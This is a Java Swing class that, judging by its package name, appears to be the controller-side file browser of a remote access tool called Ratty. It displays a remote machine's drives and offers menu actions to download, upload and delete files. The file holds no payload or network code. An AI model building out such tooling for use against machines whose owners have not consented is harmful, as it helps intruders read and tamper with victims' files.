package de.sogomn.rat.server.gui;

import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;
import java.io.File;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTree;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.TreeNode;
import javax.swing.tree.TreePath;

import de.sogomn.engine.fx.SpriteSheet;

public final class FileTreePanel {
	
	private JDialog dialog;
	
	private DefaultMutableTreeNode root;
	private JTree tree;
	private DefaultMutableTreeNode lastNodeClicked;
	private JScrollPane scrollPane;
	
	private JPopupMenu menu;
	
	private IGuiController controller;
	
	private static final String ROOT_NAME = "Drives";
	private static final int DEFAULT_WIDTH = 500;
	private static final int DEFAULT_HEIGHT = 500;
	
	private static final BufferedImage[] MENU_ICONS = new SpriteSheet("/menu_icons_tree.png", 32, 32).getSprites();
	
	public static final String REQUEST = "Show content";
	public static final String DOWNLOAD = "Download file";
	public static final String UPLOAD = "Upload file";
	public static final String DELETE = "Delete file";
	public static final String NEW_FOLDER = "New folder";
	
	public static final String[] COMMANDS = {
		REQUEST,
		DOWNLOAD,
		UPLOAD,
		DELETE,
		NEW_FOLDER
	};
	
	public FileTreePanel() {
		dialog = new JDialog();
		root = new DefaultMutableTreeNode(ROOT_NAME);
		tree = new JTree(root);
		scrollPane = new JScrollPane(tree, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		menu = new JPopupMenu();
		
		for (int i = 0; i < COMMANDS.length && i < MENU_ICONS.length; i++) {
			final String command = COMMANDS[i];
			final ImageIcon icon = new ImageIcon(MENU_ICONS[i]);
			
			addMenuItem(command, icon);
		}
		
		final MouseAdapter mouseAdapter = new MouseAdapter() {
			@Override
			public void mousePressed(final MouseEvent m) {
				final int x = m.getX();
				final int y = m.getY();
				final TreePath path = tree.getPathForLocation(x, y);
				
				tree.setSelectionPath(path);
				
				if (path != null) {
					lastNodeClicked = (DefaultMutableTreeNode)path.getLastPathComponent();
				} else {
					lastNodeClicked = null;
				}
			}
		};
		
		scrollPane.setBorder(null);
		tree.addMouseListener(mouseAdapter);
		tree.setEditable(false);
		tree.setComponentPopupMenu(menu);
		
		dialog.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		dialog.setPreferredSize(new Dimension(DEFAULT_WIDTH, DEFAULT_HEIGHT));
		dialog.setContentPane(scrollPane);
		dialog.pack();
		dialog.setLocationByPlatform(true);
		dialog.setIconImages(RattyGui.GUI_ICONS);
	}
	
	private void addMenuItem(final String name, final Icon icon) {
		final JMenuItem item = new JMenuItem(name);
		
		item.setActionCommand(name);
		item.addActionListener(this::menuItemClicked);
		item.setIcon(icon);
		
		menu.add(item);
	}
	
	private void menuItemClicked(final ActionEvent a) {
		if (controller == null) {
			return;
		}
		
		final String command = a.getActionCommand();
		
		controller.userInput(command);
	}
	
	private DefaultMutableTreeNode[] getChildren(final DefaultMutableTreeNode node) {
		final int childCount = node.getChildCount();
		final DefaultMutableTreeNode[] children = new DefaultMutableTreeNode[childCount];
		
		for (int i = 0; i < childCount; i++) {
			final DefaultMutableTreeNode child = (DefaultMutableTreeNode)node.getChildAt(i);
			
			children[i] = child;
		}
		
		return children;
	}
	
	private DefaultMutableTreeNode getByName(final DefaultMutableTreeNode node, final String name) {
		final DefaultMutableTreeNode[] children = getChildren(node);
		
		for (final DefaultMutableTreeNode child : children) {
			final Object object = child.getUserObject();
			
			if (object.equals(name)) {
				return child;
			}
		}
		
		return null;
	}
	
	private DefaultMutableTreeNode getByName(final DefaultMutableTreeNode start, final String[] path) {
		if (path.length == 0) {
			return null;
		}
		
		final String name = path[0];
		final DefaultMutableTreeNode node = getByName(start, name);
		
		if (path.length == 1 || node == null) {
			return node;
		}
		
		final String[] remainingPath = new String[path.length - 1];
		System.arraycopy(path, 1, remainingPath, 0, remainingPath.length);
		
		return getByName(node, remainingPath);
	}
	
	private void addAll(final DefaultMutableTreeNode root, final String[] path) {
		if (path.length == 0) {
			return;
		}
		
		final String name = path[0];
		
		DefaultMutableTreeNode node = getByName(root, name);
		
		if (node == null) {
			node = new DefaultMutableTreeNode(name);
			
			root.add(node);
		}
		
		final String[] remainingPath = new String[path.length - 1];
		System.arraycopy(path, 1, remainingPath, 0, remainingPath.length);
		
		addAll(node, remainingPath);
	}
	
	public void addFile(final String... path) {
		addAll(root, path);
	}
	
	public void addFile(final String path) {
		final String[] pathParts = path.split("\\" + File.separator);
		
		addFile(pathParts);
	}
	
	public void removeFile(final String... path) {
		final DefaultMutableTreeNode node = getByName(root, path);
		
		if (node != null) {
			node.removeFromParent();
		}
	}
	
	public void removeFile(final String path) {
		final String[] pathParts = path.split("\\" + File.separator);
		
		removeFile(pathParts);
	}
	
	public void clear() {
		root.removeAllChildren();
	}
	
	public void setVisible(final boolean state) {
		dialog.setVisible(state);
	}
	
	public void setController(final IGuiController controller) {
		this.controller = controller;
	}
	
	public DefaultMutableTreeNode getLastNodeClicked() {
		return lastNodeClicked;
	}
	
	public String getLastPathClicked() {
		if (lastNodeClicked == null) {
			return "";
		}
		
		final TreeNode[] parents = lastNodeClicked.getPath();
		final StringBuilder stringBuilder = new StringBuilder();
		
		for (final TreeNode node : parents) {
			final DefaultMutableTreeNode parent = (DefaultMutableTreeNode)node;
			final String name = (String)parent.getUserObject();
			
			stringBuilder.append(name + File.separator);
		}
		
		final String path = stringBuilder.toString();
		
		if (path.startsWith(ROOT_NAME + File.separator)) {
			return path.substring(ROOT_NAME.length() + 1);
		} else {
			return path;
		}
	}
	
}
